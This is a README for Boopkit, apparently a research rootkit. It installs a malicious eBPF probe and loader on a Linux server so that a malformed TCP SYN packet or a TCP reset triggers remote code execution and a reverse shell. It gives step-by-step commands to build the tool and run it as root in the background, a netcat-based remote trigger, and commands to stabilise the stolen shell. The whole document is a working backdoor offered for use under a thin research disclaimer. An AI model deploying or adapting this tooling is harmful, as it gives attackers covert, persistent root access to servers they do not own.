# Boopkit

A research project to demonstrate remote code injection over TCP with a malicious eBPF probe installed on a server.

Tested on Linux 5.17

##### Disclaimer

> This is **NOT** an exploit! This requires prior priviliged access on a server in order to work!
> I am a professional security researcher. These are white hat tools used for research purposes only.
> Use this responsibly. Never use this software illegaly.

# Demo

Install `boopkit` on a server that is already running any TCP service (EG: Kubernetes, SSH, nginx, etc).

```
git clone git@github.com:kris-nova/boopkit.git
cd boopkit
make
sudo ./boopkit > /var/log/boop.log &
```

Trigger a reverse shell over an existing TCP service. Edit the `remote` launcher script and point it at any TCP server running on the exploited machine!

```
cd remote
# edit ./remote as needed
./remote
python -c "import pty; pty.spawn('/bin/bash')"
```

Enjoy :)

# Boop Vectors

Boopkit can "boop" the probe remotely in many ways. 

### 1. Bad Checksum

The first boop that is attempted by the trigger is sending a malformed TCP SYN packet with an uncalculated checksum. This is an extremely lightweight and versatile boop as it can be ran against any server regardless if the server currently has an application running and accepting TCP connections! Yes. You can literally just "boop" a server and trigger a bad checksum as the kernel by default is listening for sockets on all ports.

### 2. TCP Resets

The first boop is scary, but not always reliable. Most modern networking hardware will drop malformed packets such as the ones required for the first boop. So a slightly less versatile vector is to boop an active TCP server in the hopes of causing the TCP server to trigger a TCP reset in the kernel. This can be done by pointing the `/trigger` program at a TCP service such as OpenSSH or Kubernetes.

These TCP resets are much riskier, less reliable, and noiser from a kernel perspective. There is also no guarantee that a TCP service will actually trigger the TCP reset tracepoint. By default Boopkit will attempt to create a more reliable SOCK_STREAM style connection before attempting the TCP reset boop, simply to validate that the remote is online and responding to TCP.


# Components

| eBPF Probe | Malicious Userspace Program                           | Remote Trigger                                              |
|------------|-------------------------------------------------------|-------------------------------------------------------------|
| Responsible for sending `tracepoint/tcp/tcp_bad_sum` events to userspace | Persistent process in Linux, that does the dirty work | Remote way to trigger the RCE over a network and TCP server |


### eBPF Probe

Can be loaded into the kernel at runtime using the userspace loader program. 
The probe responds to `tcp/tcp_bad_csum` events and will pass the `saddr` (Source Address) up to userspace using an eBPF map.


### Loader Program

This is the malicious program that will respond to the bad checksum packets sent to the server. 
Whenever a malicious packet is sent, the loader program responds with remote code execution.


### Trigger/Remote

The `trigger` binary is a small C program that will send a malformed `SYN` request without a properly calculated checksum to the server.

The `remote` script wraps the `trigger` and will use `netcat` to listen for a reverse shell.

### eBPF and Loader Compile Time Dependencies 

 - 'clang'
 - 'linux-headers'
 - 'llvm'
 - 'libbpf'
 - 'lib32-glibc'

### Boopkit runtime dependencies 

 - Linux kernel with eBPF enabled/supported
 - Ncat running on the server
 - Root access :) 

# Reverse Shell Stabilization

After a successful `/remote` the shell will be very unsightly. It is possible to use [JasonTurley.xyz](https://jasonturley.xyz/how-to-stabilize-a-reverse-shell/)'s suggestion to stablize the shell.

Select one of the commands to run in order to start a cleaner shell.

```bash
python -c "import pty; pty.spawn('/bin/bash')"
ruby -e "exec '/bin/bash'"
perl -e "exec '/bin/bash';"
```

Next move the newly created shell to the background on your local terminal.

```
Ctrl + z
```

Update the stty locally. 

```bash
stty raw -echo && fg
```

Finally, reconfigure the terminal! 

```bash
export TERM=xterm-256-color
```

